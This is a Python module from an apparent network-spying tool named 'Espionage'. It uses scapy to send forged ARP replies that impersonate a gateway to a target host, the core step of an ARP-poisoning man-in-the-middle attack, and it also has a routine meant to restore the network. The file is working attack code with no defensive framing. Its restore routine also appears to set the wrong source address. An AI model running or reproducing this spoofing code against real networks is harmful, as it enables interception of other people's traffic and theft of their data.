'''
Copyright (C) 2020 Josh Schiavone - All Rights Reserved
You may use, distribute and modify this code under the
terms of the MIT license, which unfortunately won't be
written for another century.

You should have received a copy of the MIT license with
this file. If not, visit : https://opensource.org/licenses/MIT
'''

from scapy.all import srp, send, Ether, ARP
import os, sys, time

from arp.iproute import *

from core.config import *

class ARPHandle(object):
    def __init__(self, target_address, gateway):
        self.target_address = target_address
        self.gateway = gateway

    def spoof_arp(self):
        cfg = Config()
        esp = Espionage()

        target = Address(self.target_address).retrieve_arp_mac()
        response = ARP(pdst=self.target_address, hwdst=target, psrc=self.gateway, op='is-at')

        send(response, verbose=0)
        if cfg.ESPI_SPOOF_VERBOSITY:
            host_mac_addr = ARP().hwsrc
            esp.print_espionage_message("Sent ARP Request to: {} from: {} retrieving @ {}".format(self.target_address, self.gateway, host_mac_addr))

    def restore_network(self):
        cfg = Config()
        esp = Espionage()

        mac_target = Address(self.target_address).retrieve_arp_mac()
        mac_gateway = Address(self.gateway).retrieve_arp_mac()
        response = ARP(pdst=self.target_address, hwdst=mac_target, psrc=self.target_address, hwsrc=mac_gateway)

        send(response, verbose=0, count=7)
        if cfg.ESPI_SPOOF_VERBOSITY:
            esp.print_espionage_noprefix("Restoring to: {} from: {} retrieving @ {}".format(self.target_address, self.gateway, mac_gateway))
